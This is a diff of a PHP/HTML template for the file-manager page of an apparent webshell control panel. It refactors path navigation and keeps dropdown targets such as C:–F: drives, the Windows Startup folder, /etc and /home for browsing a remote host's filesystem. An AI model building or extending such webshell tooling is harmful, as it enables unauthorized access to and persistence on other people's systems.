@@ -1,9 +1,7 @@
 <!-- content start -->
   <div class="admin-content">
     <div class="admin-content-body">
-      <div class="am-cf am-padding am-padding-bottom-0">
-        <div class="am-fl am-cf"><strong class="am-text-primary am-text-lg">Webshell</strong> / <small>文件管理</small></div>
-      </div>
+      <?php echo mianbao("file",$info["id"]); ?>
       <hr>
 		<div class="am-g">
         <div class="am-u-sm-12 am-u-md-4">
@@ -29,15 +27,13 @@
         </div>
         <div class="am-u-sm-12 am-u-md-3">
           <div class="am-form-group">
-            <select data-am-selected="{btnSize: 'sm'}" style="display: none;" onchange="selectSort(this);">
+            <select data-am-selected="{btnSize: 'sm'}" style="display: none;" onchange="location.href='index.php?action=file&gid=<?php echo $info["id"]; ?>&path='+options[selectedIndex].value">
               <option value="<?php echo $rootfile; ?>">本程序目录</option>
               <option value="C:/">C盘</option>
               <option value="D:/">D盘</option>
               <option value="E:/">E盘</option>
               <option value="F:/">F盘</option>
               <option value="C:/Documents and Settings/All Users/「开始」菜单/程序/启动">启动项</option>
-              <option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup">启动项(英)</option>
-              <option value="C:/RECYCLER">回收站</option>
               <option value="C:/Program Files">Programs</option>
               <option value="/etc">etc</option>
               <option value="/home">home</option>
@@ -46,11 +42,6 @@
             </select>
           </div>
         </div>
-        <script>
-          function selectSort(type){
-            window.location.href = "index.php?action=file&gid=<?php echo $info["id"]; ?>&path=" + type.value;
-          }
-          </script>
       </div>
       <div class="am-g">
 	 
